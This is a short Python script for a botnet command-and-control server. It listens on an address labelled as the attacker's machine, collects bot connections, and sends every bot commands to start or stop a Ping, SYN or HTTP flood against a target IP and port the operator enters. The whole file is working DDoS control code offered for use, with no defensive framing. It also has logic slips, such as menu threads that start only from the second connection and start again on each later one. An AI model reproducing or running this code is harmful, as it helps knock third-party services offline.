import socket
import threading
import os
import signal

def start_msg():
	print("Number of clients connected: " + str(len(bots)))
	print("""Enter a number to send commands to bots...
	1. Start DDoS attack
	2. Stop DDoS attack
	3. Exit botnet program""")
	
def commands():
	while True:
		option = int(input("Enter option number: "))
		if option == 1:
			target_ip = input("Enter target IP address: ").encode()
			target_port = input("Enter target port: ").encode()
			ddos_type = input("Enter type of DDoS attack (Ping/SYN/HTTP): ").encode()
			for bot in bots:
				bot.send("DDoS_".encode() + target_ip + "_".encode() + target_port + "_".encode() + ddos_type)
			print("Starting DDoS on target...")
		
		elif option == 2:
			for bot in bots:
				bot.send("Stop attack".encode())
			print("Stopping DDoS on target...")

		elif option == 3:
			for bot in bots:
				bot.send("Exit program".encode())
			print("Exiting program...")
			sock.close() # Close socket
			os.kill(os.getpid(), signal.SIGINT)
		
		else:
			print("You entered an invalid option!")

ip = "192.168.10.100" #Attacker's machine IP
port = 9999
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip, port))
sock.listen(5)
bots = []
first_connection = False

print("Waiting for connections...")

while True:
	bot, ip = sock.accept()
	bots.append(bot)
	print("{} successfully connected!".format(ip))
	
	if first_connection == True:
		thrd2 = threading.Thread(target=start_msg)
		thrd2.start()
		thrd = threading.Thread(target=commands)
		thrd.start()
	first_connection = True